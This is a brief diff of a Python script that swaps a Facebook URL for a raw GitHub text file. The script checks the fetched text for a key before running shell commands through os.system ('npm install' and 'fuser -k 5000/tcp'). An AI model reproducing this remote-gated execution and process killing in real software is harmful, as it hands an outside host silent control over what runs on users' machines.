@@ -92,7 +92,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX').text
+    r = requests.get('https://raw.githubusercontent.com/MohsinTheLegend/Mohsin/main/robot.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
